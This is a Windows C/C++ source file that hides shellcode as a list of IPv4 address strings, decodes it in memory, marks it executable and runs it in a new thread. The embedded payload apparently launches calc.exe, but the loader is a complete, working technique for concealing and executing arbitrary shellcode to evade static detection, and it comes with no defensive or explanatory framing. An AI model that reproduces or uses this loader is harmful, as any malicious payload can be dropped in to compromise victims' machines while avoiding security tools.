#include <Windows.h>
#include <stdio.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

const char* IPv4[] = {
    "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192",
    "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68",
    "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68",
    "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65",
    "89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139", "111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255",
    "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71", "19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.46", "101.120.101.0"
};

#define ElementsNumber 69
#define SizeOfShellcode 276

BOOL DecodeIPv4Fuscation(const char* IPV4[], PVOID LpBaseAddress) {
    PCSTR Terminator = NULL;
    PVOID LpBaseAddress2 = NULL;
    NTSTATUS STATUS;
    int i = 0;
    for (int j = 0; j < ElementsNumber; j++) {
        LpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);
        STATUS = RtlIpv4StringToAddressA((PCSTR)IPV4[j], FALSE, &Terminator, (in_addr*)LpBaseAddress2);
        if (!NT_SUCCESS(STATUS)) {
            printf("[!] RtlIpv6StringToAddressA failed for %s result %x", IPV4[j], STATUS);
            return FALSE;
        }
        else {
            i = i + 4;
        }
    }
    return TRUE;
}

int main() {
    // Allocate memory for the deobfuscated result
    PVOID deobfuscatedResult = VirtualAlloc(NULL, SizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (deobfuscatedResult == NULL) {
        printf("[!] Memory allocation failed\n");
        return -1;
    }

    // Decode the obfuscated IPv4 addresses
    if (DecodeIPv4Fuscation(IPv4, deobfuscatedResult)) {
        
       
        LPVOID memory_address = VirtualAlloc(NULL, SizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
            // [in, optional] LPVOID lpAddress,
            // [in]           SIZE_T dwSize,
            // [in]           DWORD  flAllocationType,
            // [in]           DWORD  flProtect
        );

        // load shellcode into memory
        RtlMoveMemory(memory_address, deobfuscatedResult, SizeOfShellcode
            // _Out_       VOID UNALIGNED *Destination,
            // _In_  const VOID UNALIGNED *Source,
            // _In_        SIZE_T         Length
        );

        // make shellcode executable
        DWORD old_protection = 0;
        BOOL returned_vp = VirtualProtect(memory_address, SizeOfShellcode, PAGE_EXECUTE_READ, &old_protection
            // [in]  LPVOID lpAddress,
            // [in]  SIZE_T dwSize,
            // [in]  DWORD  flNewProtect,
            // [out] PDWORD lpflOldProtect
        );

        // execute thread
        if (returned_vp != NULL) {
            HANDLE thread_handle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)memory_address, NULL, NULL, NULL
                // [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
                // [in]            SIZE_T                  dwStackSize,
                // [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
                // [in, optional]  __drv_aliasesMem LPVOID lpParameter,
                // [in]            DWORD                   dwCreationFlags,
                // [out, optional] LPDWORD                 lpThreadId
            );

            // wait for thread to complete
            WaitForSingleObject(thread_handle, INFINITE
                // [in] HANDLE hHandle,
                // [in] DWORD  dwMilliseconds
            );
        }



      VirtualFree(deobfuscatedResult, 0, MEM_RELEASE);
    }


    return 0;
}
